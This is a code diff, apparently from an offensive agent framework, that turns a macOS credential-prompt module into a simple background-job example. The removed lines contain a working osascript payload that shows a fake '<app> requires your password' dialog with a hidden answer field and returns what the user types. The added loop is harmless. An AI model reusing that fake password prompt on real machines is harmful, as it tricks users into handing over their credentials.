@@ -5,19 +5,19 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'Prompt',
+            'Name': 'Background Example',
 
             # list of one or more authors for the module
-            'Author': ['@FuzzyNop', '@harmj0y'],
+            'Author': ['@Killswitch-GUI'],
 
             # more verbose multi-line description of the module
-            'Description': ('Launches a specified application with an prompt for credentials with osascript.'),
+            'Description': ('A quick example how to feed your data to a background job.'),
 
             # True if the module needs to run in the background
-            'Background' : False,
+            'Background' : True,
 
             # File extension to save the file as
-            'OutputExtension' : "",
+            'OutputExtension' : '',
 
             # if the module needs administrative privileges
             'NeedsAdmin' : False,
@@ -26,9 +26,7 @@ class Module:
             'OpsecSafe' : False,
 
             # list of any references/other comments
-            'Comments': [
-                "https://github.com/fuzzynop/FiveOnceInYourLife"
-            ]
+            'Comments': [ ]
         }
 
         # any options needed by the module, settable during runtime
@@ -39,18 +37,6 @@ class Module:
                 # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
-                'Value'         :   ''
-            },
-            'AppName' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'The name of the application to launch.',
-                'Required'      :   True,
-                'Value'         :   'App Store'
-            },
-            'ListApps' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'Switch. List applications suitable for launching.',
-                'Required'      :   False,
                 'Value'         :   ''
             }
         }
@@ -72,26 +58,16 @@ class Module:
 
     def generate(self):
 
-        listApps = self.options['ListApps']['Value']
-        appName = self.options['AppName']['Value']
-
-        if listApps != "":
-            script = """
-import os
-apps = [ app.split('.app')[0] for app in os.listdir('/Applications/') if not app.split('.app')[0].startswith('.')]
-choices = []
-for x in xrange(len(apps)):
-    choices.append("[%s] %s " %(x+1, apps[x]) )
-
-print "\\nAvailable applications:\\n"
-print '\\n'.join(choices)
+        script = """
+x = 0
+while True:
+    import time
+    try:
+        time.sleep(2)
+        msg = 'NOW inside buffer at message: ' + str(x) + '\\n'
+        job_message_buffer(msg)
+        x += 1
+    except Exception as e:
+        print e
 """
-
-        else:
-            # osascript prompt for the specifiec application
-            script = """
-import os
-print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
-""" % (appName, appName, appName, appName)
-
         return script
